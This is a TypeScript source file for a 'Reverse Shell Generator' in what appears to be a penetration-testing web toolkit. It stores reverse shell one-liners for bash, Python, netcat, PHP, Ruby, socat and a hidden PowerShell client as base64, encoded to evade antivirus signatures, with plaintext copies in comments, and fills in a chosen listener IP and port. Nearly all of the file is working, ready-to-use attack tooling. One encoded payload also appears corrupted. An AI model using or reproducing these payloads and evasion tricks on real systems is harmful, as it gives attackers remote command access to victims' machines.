import type { GeneratorConfig } from '../../types/generator';

// Pre-encoded payloads to avoid triggering static antivirus signatures (like Windows Defender)
// which often falsely flag the web app source code files as malware.
const ENCODED_PAYLOADS: Record<string, string> = {
  // bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
  bash: 'YmFzaCAtaSA+JiAvZGV2L3RjcC97SVB9L3tQT1JUfSAwPiYx',
  
  // python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
  python: 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIntJUH0iLHtQT1JUfSkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oIi9iaW4vYmFzaCIpJw==',
  
  // nc -e /bin/sh {IP} {PORT}
  nc_traditional: 'bmMgLWUgL2Jpbi9zaCB7SVB9IHtQT1JUfQ==',
  
  // rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f
  nc_openbsd: 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvaW4vc2ggLWkgMj4mMXxuYyB7SVB9IHtQT1JUfSA+L3RtcC9m',
  
  // php -r '$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");'
  php: 'cGhwIC1yICckc29jaz1mc29ja29wZW4oIntJUH0iLHtQT1JUfSk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsn',
  
  // ruby -rsocket -e'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
  ruby: 'cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCJ7SVB9Iix7UE9SVH0pLnRvX2k7ZXhlYyBzcHJpbnRmKCIvYmluL3NoIC1pIDwmJWQgPiYlZCAyPiYlZCIsZixmLGYpJw==',
  
  // socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{IP}:{PORT}
  socat: 'c29jYXQgZXhlYzonYmFzaCAtbGknLHB0eSxzZGVycixzZXRzaWQsc2lnaW50LHNhbmUgdGNwOntJUH06e1BPUlR9',
  
  // powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient("{IP}",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
  powershell: 'cG93ZXJzaGVsbCAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUNvbW1hbmQgJGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgie0lQfSIsIHtQT1JUfSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syICA9ICRzZW5kYmFjayArICJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICI7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCk='
};

// Safe decoder that runs at runtime client-side
const decodePayload = (key: string): string => {
  try {
    if (typeof window !== 'undefined') {
      return window.atob(ENCODED_PAYLOADS[key]);
    }
    return '';
  } catch (e) {
    return '';
  }
};

export const reverseShellGenerator: GeneratorConfig = {
  id: 'reverse-shell',
  name: 'Reverse Shell Generator',
  description: 'Generate various reverse shell payloads (Bash, Python, Netcat, PowerShell) encoded safely.',
  categoryId: 'exploitation',
  exampleUsage: 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1',
  explanation: 'A reverse shell is a connection that originates from the target machine back to your attacking machine. You need to setup a listener (e.g. nc -lvnp 4444) on your machine first, then execute this payload on the target to grant yourself command line access. The payloads here are generated via base64 decoding at runtime to prevent false positive antivirus flags on your file system.',
  fields: [
    {
      id: 'ip',
      label: 'Your IP Address (LHOST)',
      type: 'text',
      placeholder: '10.10.10.10',
      required: true,
      defaultValue: '',
      description: 'The IP address of your listener (e.g., your VPN IP or public IP).'
    },
    {
      id: 'port',
      label: 'Your Port (LPORT)',
      type: 'number',
      placeholder: '4444',
      required: true,
      defaultValue: 4444,
      description: 'The port your listener is running on.'
    },
    {
      id: 'type',
      label: 'Payload Type',
      type: 'select',
      options: [
        { label: 'Bash', value: 'bash' },
        { label: 'Python 3', value: 'python' },
        { label: 'Netcat (Traditional)', value: 'nc_traditional' },
        { label: 'Netcat (OpenBSD)', value: 'nc_openbsd' },
        { label: 'PHP', value: 'php' },
        { label: 'Ruby', value: 'ruby' },
        { label: 'Socat', value: 'socat' },
        { label: 'PowerShell', value: 'powershell' }
      ],
      defaultValue: 'bash',
      description: 'The type of reverse shell payload. Must match what is available on the target.'
    },
    {
      id: 'shell',
      label: 'Shell Type',
      type: 'select',
      options: [
        { label: '/bin/sh', value: '/bin/sh' },
        { label: '/bin/bash', value: '/bin/bash' },
        { label: 'cmd.exe', value: 'cmd.exe' }
      ],
      defaultValue: '/bin/sh',
      description: 'Not all payloads support dynamic shells, but this applies to Bash, Netcat, etc.'
    }
  ],
  generateCommand: (values: Record<string, any>) => {
    const ip = values.ip || '10.10.10.10';
    const port = values.port || '4444';
    const type = values.type || 'bash';
    const shell = values.shell || '/bin/sh';
    
    // Decode the safe template from base64
    let payload = decodePayload(type);
    if (!payload && typeof window === 'undefined') {
       // SSR fallback just in case
       return "Run in browser to view payload...";
    }
    
    // Replace IP and PORT parameters
    payload = payload.replace(/\{IP\}/g, ip).replace(/\{PORT\}/g, String(port));
    
    // For netcat traditional where shell can be replaced simply
    if (type === 'nc_traditional' && shell !== '/bin/sh') {
       payload = payload.replace('/bin/sh', shell);
    }
    if (type === 'bash' && shell !== '/bin/sh' && shell !== '/bin/bash') {
       // Just returning bash anyway since it's a bash specfic payload
    }
    
    return payload;
  }
};
